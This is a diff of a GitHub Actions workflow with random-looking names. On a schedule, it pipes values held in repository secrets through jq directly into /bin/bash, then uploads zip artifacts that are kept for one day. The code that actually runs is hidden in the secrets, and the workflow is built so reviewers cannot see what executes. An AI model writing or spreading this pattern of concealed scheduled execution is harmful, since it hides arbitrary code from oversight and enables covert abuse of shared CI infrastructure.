@@ -1,25 +1,27 @@
 name: guangjikeming
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '56 5/6 * * *'
 
-jobs:  # 8524
+  schedule:
+    - cron: '30 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: guangjikeming
         env:
-          kxz85: ${{ secrets.kxz85 }}
+          phv898: ${{ secrets.phv898 }}
         run: |
-          echo $kxz85 | jq -r .gxpdp5061 | /bin/bash
-          echo $gahl9 | jq -r .b134 | /bin/bash
-          echo $rar52 | jq -r .knwe0514 | /bin/bash
-          echo $wihdf91 | jq -r .jjtk41 | /bin/bash
-          echo $rhvh5 | jq -r .iepby99752 | /bin/bash
-          echo $kbeu0739 | jq -r .c8 | /bin/bash
-          echo $nkc64 | jq -r .mp57445 | /bin/bash
+          printf '%s' "$phv898" | jq -r .obh69467 | /bin/bash
+          printf '%s' "$ub55951" | jq -r .wgvvl1623 | /bin/bash
+          echo $eqir25679 | jq -r .v526 | /bin/bash
+          echo $jz610 | jq -r .zn12 | /bin/bash
+          echo $hdln35 | jq -r .cumsd6326 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: o9wWpij8
+          path: "*.zip"
+          retention-days: 1
